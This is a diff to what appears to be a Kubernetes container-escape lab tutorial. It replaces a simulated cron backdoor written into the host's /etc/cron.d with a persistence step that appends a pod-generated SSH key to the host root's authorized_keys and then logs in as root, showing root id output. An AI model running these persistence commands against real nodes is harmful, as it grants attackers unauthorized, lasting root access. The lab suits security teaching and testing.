@@ -56,27 +56,34 @@ The Kubelet's credentials allow it to:
 - Update its own Node status.
 - (In some misconfigured clusters) Read all secrets in the cluster.
 
-### 3.2. Persistence via Cron
+### 3.2. Persistence via SSH Keys
 
-We want to make sure that even if this pod is deleted, we still have code execution on the node. We can add a malicious cron job to the **Host's** `/etc/cron.d/`.
+Since `cron` might not be installed on minimal container-optimized OS nodes (like Kind nodes), a more reliable persistence method is adding our SSH key to the host's `authorized_keys`.
 
 ```bash
-# Create a reverse shell payload (simulated)
-echo "* * * * * root echo 'I OWN THIS NODE' > /tmp/pwned.txt" > /host/etc/cron.d/backdoor
+# Generate a keypair inside the pod (if needed)
+ssh-keygen -t rsa -f /tmp/id_rsa -N ""
 
-# Verify it exists
-cat /host/etc/cron.d/backdoor
+# Add the public key to the Host's root user
+mkdir -p /host/root/.ssh
+cat /tmp/id_rsa.pub >> /host/root/.ssh/authorized_keys
+chmod 600 /host/root/.ssh/authorized_keys
+
+# Verify
+cat /host/root/.ssh/authorized_keys
 ```
 
-Now, every minute, the **Host OS** will execute our command. In a real scenario, this would be a reverse shell connecting back to our C2 server.
+Now, if the SSH port is exposed (and reachable), we can SSH directly into the node as root!
 
 ### 3.3. Check the Persistence
 
-Wait a minute, then check if the file was created on the host:
+Try to SSH into the host (localhost) from the pod:
 
 ```bash
-cat /host/tmp/pwned.txt
+ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no root@127.0.0.1 "id"
 ```
+
+**Output:** `uid=0(root) gid=0(root) groups=0(root)`
 
 ## 4. Fix
 
